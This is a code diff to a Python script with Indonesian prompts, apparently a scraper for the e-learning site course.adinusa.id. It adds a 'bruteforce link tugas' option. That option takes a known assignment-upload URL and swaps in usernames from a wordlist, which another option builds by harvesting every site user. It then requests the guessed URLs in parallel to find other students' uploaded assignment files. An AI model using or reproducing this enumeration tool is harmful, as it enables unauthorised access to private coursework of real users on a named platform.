@@ -4,9 +4,12 @@ import requests
 import os
 import sys
 from getpass import getpass
+import concurrent.futures
+
 
 s = requests.session()
 list_materi = []
+link_tugas = ""
 
 headers = {
     'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0',
@@ -189,9 +192,43 @@ def get_all_user():
     for i in list_username:
       f.write(i + "\n")
 
+def cek_tugas(username):
+  global link_tugas
+
+  #preprocessing data
+  username = username.strip()
+  m = re.split(r'/([A-Za-z0-9.-]+)_', link_tugas)
+  newlink_tugas = m[0] + '/' + username + '_'+m[2]
+
+  content = s.get(newlink_tugas)
+  if content.status_code == 200:
+    print("[found]", newlink_tugas)
+
+def proses_cek_tugas():
+  global link_tugas
+  
+  wordlist = open('wordlist').readlines()
+  custom_wordlist = input('mau menggunakan custom wordlist ? (y/N) ')
+  if custom_wordlist.lower() == 'y':
+    nama_file = input('masukkan nama file wordlist : ')
+    wordlist = open(nama_file).readlines()
+
+  link_tugas = input(' [note]\n masukan link tugas yang pernah di upload di course target\n contoh :  https://course.adinusa.id/media/uploads/username_210_quiz2.zip\n link target : ')
+
+  with concurrent.futures.ThreadPoolExecutor() as executor:
+    executor.map(cek_tugas, wordlist)
 def menu():
-    print(""" 1. get list materi\n 2. get materi course\n 3. get info user\n 4. get all user for wordlist""")
+    print(""" 
+      ┌──────────────┐
+      │ Adinusa Tool │
+      └──────────────┘
+     1. cek semua list materi
+     2. download materi
+     3. cek informasi profil
+     4. buat wordlist dari semua user adinusa
+     5. bruteforce link tugas""")
     menu = input("masukan pilihan : ")
+
     if menu == '1':
     	get_list_materi_user()
     elif menu == '2':
@@ -201,6 +238,8 @@ def menu():
     	get_info_user()
     elif menu == '4':
       get_all_user()
+    elif menu == '5':
+      proses_cek_tugas()
     else:
     	print('ngapain ?')
     	menu() 
